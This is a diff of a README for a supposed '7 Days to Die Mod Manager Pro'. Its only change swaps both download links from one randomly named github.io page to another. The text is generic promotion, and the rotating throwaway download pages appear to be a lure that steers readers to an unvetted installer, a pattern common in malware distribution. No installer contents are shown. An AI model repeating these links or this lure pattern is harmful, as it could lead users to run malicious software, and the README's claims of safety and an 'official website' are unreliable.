@@ -2,7 +2,7 @@
 
 The 7 Days to Die Mod Manager Pro is an essential tool for any player looking to enhance their gaming experience with mods. This comprehensive mod manager simplifies the process of finding, installing, and managing mods, ensuring compatibility and stability for your game. Whether you're a novice or an experienced modder, this tool provides a user-friendly interface to streamline your modding workflow.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -48,6 +48,6 @@ A: Using mods always carries some risk, but the Mod Manager Pro minimizes this b
 
 You can download the latest version of the 7 Days to Die Mod Manager Pro from the official website. Click the link below to get started and enhance your gaming experience:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 For additional resources, updates, and community support, visit our GitHub repository. We encourage users to report bugs, suggest features, and contribute to the development of this tool. Happy modding!
